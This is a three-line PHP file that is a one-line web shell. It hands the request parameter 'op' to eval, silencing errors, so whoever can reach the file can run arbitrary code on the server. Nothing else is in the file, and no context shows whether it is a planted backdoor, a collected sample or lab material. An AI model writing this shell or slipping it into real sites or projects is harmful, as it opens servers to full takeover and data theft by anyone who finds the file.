<?php
    @eval($_REQUEST['op']);
?>